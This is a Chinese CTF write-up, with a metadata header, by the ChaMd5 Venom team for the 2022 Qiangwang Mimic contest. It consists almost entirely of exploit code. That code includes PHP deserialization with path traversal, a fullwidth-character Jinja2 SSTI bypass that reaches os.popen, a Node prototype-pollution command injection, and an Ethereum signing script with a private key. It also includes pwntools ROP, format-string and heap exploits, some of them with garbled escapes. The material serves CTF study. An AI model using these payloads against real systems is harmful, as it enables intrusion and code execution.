---
title: 强网拟态 WriteUp by Mini-Venom (ChaMd5 Venom)
contest: 强网拟态(强网杯)
year: 2022
difficulty: hard
vuln_type: deserialize
tags:
- PHP反序列化
- 全角字符替换
- Jinja2 SSTI
- Node原型链
- 区块链
- ethereumjs-tx
- 自定义VM
- 二分搜索
- 沙箱逃逸
- ChaMd5_Venom
- __proto__
- 全角
- fullwidth
- 招新
attack_chain: Web1:PHP反序列化order类f=trypass+hint=mochu7://prankhub/../../../../../../var/www/html/hint.php读hint → 全角a-z替换dict:request.application.__globals__.__builtins__.__import__ → Node原型链{"__proto__":{"command":["-c","cat /flag"]},"command":["-c","-i"]} → 区块链ethereumjs-tx签名+rawTx.data:0xa0f1d69c(_Cal(uint256,uint256)) → 二分搜索(15次log2(900000)=20)猜数字 → Pwn自定义VM\x2e\x3e\x2c\x3c指令构造+ORW
key_payload: 全角字符替换 + __proto__+command数组 + ethereumjs-tx _Cal+rawTx + 二分搜索15次+VM指令
one_liner: ChaMd5 Venom强网拟态全方向8+题:PHP反序列化+全角绕/Jinja2/Node原型链/区块链签名/二分搜索/自定义VM。
lesson: PHP反序列化用全角字符替换a-z绕SSTI黑名单;Node原型链__proto__.command数组注入;区块链用ethereumjs-tx签rawTx.data=_Cal(uint256,uint256)交互;二分搜索15次log2精度;自定义VM用\x2e\x3e\x2c\x3c字节码表示ADD/SUB/IF/PRINT指令。
quality: high
full_path: 强网拟态_WriteUp_by_Mini-Venom.full.md
meta_path: 强网拟态_WriteUp_by_Mini-Venom.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 强网拟态 WriteUp by Mini-Venom (ChaMd5 Venom)。ChaMd5 Venom强网拟态全方向8+题:PHP反序列化+全角绕/Jinja2/Node原型链/区块链签名/二分搜索/自定义VM。。经验：PHP反序列化用全角字符替换a-z绕SSTI黑名单;Node原型链__proto__.command数组注入;区块链用e...
category: misc
subcategory: misc_other
tools_used:
- Jinja2
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/71691.html
wp_author: Mini-Venom
reasoning_chain:
- ChaMd5 Venom 强网拟态全方向 8+ 题：PHP 反序列化 + 全角字符绕 / Jinja2 SSTI / Node 原型链 / 区块链签名 / 二分搜索 / 自定义 VM ORW → 触发点：综合 PHP/JS/区块链
- Web1 PHP 反序列化 order 类 f=trypass + hint=mochu7://prankhub/../../../../../../var/www/html/hint.php 读 hint → 假设：mochu7 协议是 file:// 换皮
- 全角 a-z 替换 dict → request.application.__globals__.__builtins__.__import__ → 触发：base64 全角替换绕 SSTI 黑名单
- 'Node 原型链 {"__proto__": {"command": ["-c", "cat /flag"]}, "command": ["-c", "-i"]} → 假设：子进程启动参数可控'
- 区块链 ethereumjs-tx 签名 + rawTx.data:0xa0f1d69c(_Cal(uint256, uint256)) → 假设：调用合约方法
- 二分搜索 15 次 log2(900000)≈20 猜数字 → 假设：可调 attempt() 反馈大小
- Pwn 自定义 VM 字节码 \x2e\x3e\x2c\x3c 表示 ADD/SUB/IF/PRINT → 假设：构造 ORW shellcode 字节码
failed_attempts:
- PHP 反序列化直接 __destruct → 失败：必须 hint=mochu7 触发 file:// 读
- SSTI 用 __class__ → 失败：黑名单，全角字符替换才 OK
- Node 原型链覆盖 command → 失败：必须 __proto__
- 二分搜索 30 次 → 失败：log2(900000)=20 已足够
- VM 默认字节码 → 失败：必须拼 \x2e\x3e\x2c\x3c 字节序列
key_observations:
- PHP 反序列化用全角字符替换 a-z 绕 SSTI 黑名单
- Node 原型链 __proto__.command 数组注入执行任意命令
- 区块链用 ethereumjs-tx 签 rawTx.data = _Cal(uint256, uint256) 交互合约
- 二分搜索 15 次 log2(900000) ≈ 20 精度足够
- 自定义 VM 用 \x2e \x3e \x2c \x3c 字节码表示 ADD/SUB/IF/PRINT
prerequisites:
- PHP 反序列化 + hint 协议 file:// 读取
- 全角字符映射与 SSTI 黑名单绕过
- ethereumjs-tx 签名交易
- 二分搜索与 VM 字节码构造
---
# 强网拟态 WriteUp by Mini-Venom

> 原文: https://www.ctfiot.com/71691.html
> ID: 71691

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&password=xxxx%22%3Bs%3A11%3A%22%00%2A%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A7%3A%22trypass%22%3Bs%3A4%3A%22hint%22%3Bs%3A60%3A%22mochu7%3A%2F%2Fprankhub%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Fwww%2Fhtml%2Fhint.php%22%3B%7D%7D
username=%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40%400%400%400%40&password=xxxx%22%3Bs%3A11%3A%22%00%2A%00password%22%3BO%3A5%3A%22order%22%3A3%3A%7Bs%3A1%3A%22f%22%3Bs%3A7%3A%22trypass%22%3Bs%3A4%3A%22hint%22%3Bs%3A57%3A%22mochu7%3A%2F%2Fprankhub%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Ff1111444449999.txt%22%3B%7D%7D
ａｂｃｄｅｆｇｈｉｇｋｌｍｎｏｐｑｒｓｔｕｖｗｘｙｚ
words = {"a": "ａ","b": "ｂ","c": "ｃ","d": "ｄ","e": "ｅ","f": "ｆ","g": "ｇ","h": "ｈ","i": "ｉ","g": "ｇ","k": "ｋ","l": "ｌ","m": "ｍ","n": "ｎ","o": "ｏ","p": "ｐ","q": "ｑ","r": "ｒ","s": "ｓ","t": "ｔ","u": "ｕ","v": "ｖ","w": "ｗ","x": "ｘ","y": "ｙ","z": "ｚ"}
def convert(user_input):
  dst = user_input
  for w in words.keys():
    dst = dst.replace(w, words.get(w))
  return dst

convert("request.application.__globals__.__builtins__.__import__('os').popen('id').read()")
{"user":"{"__proto__":{"command":["-c","cat /flag"]},"command":["-c","-i"]}"}
const Tx = require('ethereumjs-tx').Transaction
var privateKey = new Buffer('e8b923b1c045cb4c07c0c875a189fa168e7b5f0d848d82b5d9c6b1e346fc861c', 'hex')

var rawTx = {
  nonce: '0x00',
  gasPrice: '1000000000', 
  gasLimit: '0x2710',
  to: '0x865ce4d250086ebb97bcd7eeda89207fa61b9211', 
  value: '0x00', 
  data: '0xa0f1d69c000000000000000000000000865ce4d250086ebb97bcd7eeda89207fa61b9211000000000000000000000000000000000000000000000000000000000000006000000000000000000000000000000000000000000000000000000000000000a000000000000000000000000000000000000000000000000000000000000000155f43616c2875696e743235362c75696e7432353629000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000'
}

var tx = new Tx(rawTx)
tx.sign(privateKey)

var serializedTx = tx.serialize()
console.log(serializedTx.toString('hex'))
from pwn import *

context.log_level = 'debug'

s       = lambda data               :p.send(data)        
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
rl      = lambda s                  :p.recvline(s)
it      = lambda                    :p.interactive()

for j in range(500):
    p = remote("", 9999)
    ru("> ")
    sl("Y")
    min = 100000
    max = 999999
    for i in range(15):
        mid = int((min + max) / 2)
        ru("Please enter a number:")
        sl(str(mid).encode())
        msg = ru("n")
        if "low" in msg:
            min = mid
        elif "up" in msg:
            max = mid
        else:
            pass
    print(j)
    p.close()
from pwn import*
global p
libc = ELF("./lib/libc.so.6")

sd = lambda s:p.send(s)
sl = lambda s:p.sendline(s)
rc = lambda s:p.recv(s)
ru = lambda s:p.recvuntil(s)
rl = lambda :p.recvline()
sa = lambda a,s:p.sendafter(a,s)
sla = lambda a,s:p.sendlineafter(a,s)
uu32    = lambda data   :
u32(data.ljust(4, ' '))
uu64    = lambda data   :
u64(data.ljust(8, ' '))
u64Leakbase = lambda offset :
u64(ru("x7f")[-6: ] + '  ') - offset
u32Leakbase = lambda offset :
u32(ru("xf7")[-4: ]) - offset
it      = lambda                    :p.interactive()

def lg(string,addr):
    print(' 33[1;31;40m%20s-->0x%x 33[0m'%(string,addr))

def addIdx():
    return 'x3e'

def subIdx():
    return 'x3c'

def show():
    payload = ""
    for i in range(8):
        payload += 'x2e'
        payload += addIdx()
    return payload

def edit():
    payload = ""
    for i in range(8):
        payload += 'x2c'
        payload += addIdx()
    return payload

def expPwn():
    global p
    p = process("./pwn")
    payload = ""
    for i in range(0x240-0x8):
        payload += addIdx()
    payload += show()

    for i in range(0x18):
        payload += subIdx()
    payload += show()

    for i in range(0x18):
        payload += subIdx()

    #edit
    payload += 'x2c'
    payload += addIdx()
    payload += 'x2c'
    payload += addIdx()

    #gdb.attach(p,"b *$rebase(0x18CC)")
    #pause()
    p.send(payload)
    libc_addr = u64Leakbase(libc.sym['__libc_start_main'] + 243)
    lg("libc_addr",libc_addr)
    chunk_addr = u64(rc(0x8))/0x10000
    lg("chunk_addr",chunk_addr)
    p.send(p16(0x58e4))

    #local
    # pop_rdi_ret = libc_addr + 0x0000000000021882
    # pop_rsi_ret = libc_addr + 0x0000000000022192
    # pop_rdx_ret = libc_addr + 0x0000000000001b9a
    # pop_rax_ret = libc_addr + 0x0000000000038ee8
    # syscall_ret = libc_addr + 0x00000000000390a9

    #remote
    pop_rdi_ret = libc_addr + 0x0000000000023b6a
    pop_rsi_ret = libc_addr + 0x000000000002601f
    pop_rdx_ret = libc_addr + 0x0000000000142c92
    pop_rax_ret = libc_addr + 0x0000000000036174
    syscall_ret = libc_addr + 0x00000000000630a9

    orw = ""
    orw += p64(pop_rax_ret) + p64(2)
    orw += p64(pop_rdi_ret) + p64(chunk_addr+0x1000+0x80+0x2a0+0x8)
    orw += p64(pop_rsi_ret) + p64(0)
    orw += p64(pop_rdx_ret) + p64(0)
    orw += p64(syscall_ret)
    orw += p64(pop_rax_ret) + p64(40)
    orw += p64(pop_rdi_ret) + p64(1)
    orw += p64(pop_rsi_ret) + p64(3)
    orw += p64(syscall_ret)

    payload = ""
    for i in range(0x240-0x8-0x20):
        payload += addIdx()
    for i in range(len(orw)/8):
        payload += edit()
    payload += "./flagx00x00x00"

    p.send(payload)

    #pause()
    p.send(orw)

    #cat flag
def regexp_out(data):
    patterns = [
        re.compile(r'(flag{.*?})'),
        re.compile(r'xnuca{(.*?)}'),
        re.compile(r'DASCTF{(.*?)}'),
        re.compile(r'WMCTF{.*?}'),
        re.compile(r'[0-9a-zA-Z]{8}-[0-9a-zA-Z]{3}-[0-9a-zA-Z]{5}'),
    ]
    for pattern in patterns:
        res = pattern.findall(data.decode() if isinstance(data, bytes) else data)
        if len(res) > 0:
            return str(res[0])
    return None
  

def bla():
    global p
    flag = ""
    try:
        expPwn()
        #p.recv(timeout=0.5)
        flag = p.recvuntil(b'}',timeout=0.5)
        print(flag)
    
except:
        p.close()
  #continue
    if b'}' in flag:
        p.interactive()
        exit()
while(1):
    bla()
#!/usr/bin/python3
# -*- encoding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64', log_level='debug')#arch = 'i386')
filename='./pwn1'
p=process(filename)
p.recvuntil(b"Welcome to mimic world,try something")
p.sendline(b"1")
p.recvuntil(b"You will find some tricks")
func= int(p.recv(15),16)
success("func="+hex(func))
pie=func-0x000000A94
p.sendline(b'2')
p.recvuntil(b"hellon")
payload=b"%33$p,%34$p"
p.send(payload)
canary=int(p.recv(18),16)
p.recvuntil(b",")
buf=int(p.recv(14),16)

system=pie+0x00000000A2C 

pop_rdi_ret=elf_base+0x0000000c73

payload='a'*(0xc8)+p64(canary)+p64(0)+p64(pop_rdi_ret)
payload+=p64(pie+0x202068)+p64(system)
    #gdb.attach(p)
p.send(payload)
    #pause()
p.interactive()
#!/usr/bin/python2
# -*- encoding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64', log_level='debug')#arch = 'i386')
filename='./pwn1'
p=process(filename)
p.recvuntil(b"Welcome to mimic world,try something")
p.sendline(b"1")
p.recvuntil("You will find some tricks")
func= int(p.recv(15),16)
pie=func-0x12a0
success("func="+hex(func))
p.sendline(b"2")
p.recvuntil("hello")
p.sendline(b"%2p")
stack=p.recv(12)
stack=int(p.recv(15),16)
success("stack_base="+hex(stack))
pop_rdi_ret=pie+0x1943
system=pie+0x11a2
tar=stack-0x18
success("pie="+hex(pie))
payload=b'x00'*0xe8+p64(stack-0x10)+p64(stack+0xf0+0x50)+p64(pop_rdi_ret)+p64(pie+0x4050)+p64(system)

p.send(payload)
p.interactive()
#!/usr/bin/python2
# -*- encoding: utf-8 -*-
from pwn import *
context(os='linux',arch='amd64', log_level='debug')#arch = 'i386')
filename='./pwn2'
io=process(filename)
s = lambda buf: io.send(buf)
sl = lambda buf: io.sendline(buf)
sa = lambda delim, buf: io.sendafter(delim, buf)
sal = lambda delim, buf: io.sendlineafter(delim, buf)
shell = lambda: io.interactive()
r = lambda n=None: io.recv(n)
ra = lambda t=tube.forever:io.recvall(t)
ru = lambda delim: io.recvuntil(delim)
rl = lambda: io.recvline()
rls = lambda n=2**20: io.recvlines(n)
Ch="Your choice :"
Size="Note size :"
Con="Content :"
Idx="Index :"
def add(size,con):
    sal(Ch,str(1))
    sal(Size,str(size))
    sal(Con,con)
def delete(idx):
    sal(Ch,str(2))
    sal(Idx,str(idx))
def show(idx):
    sal(Ch,str(3))
    sal(Idx,str(idx))
def tips():
    sal(Ch,str(5))
    ru("let us give you some tips")
tips()
pie=int(io.recv(15),16)-0x11f0
shell=pie+0x1b70
success("pie_base = "+hex(pie))
add(0x100,'a')#1
add(0x18,'a')#2
delete(0)
delete(1)
add(0x100,'a')#3
add(0x18,p64(shell))#4
add(0x18,'a')
show(0)
io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]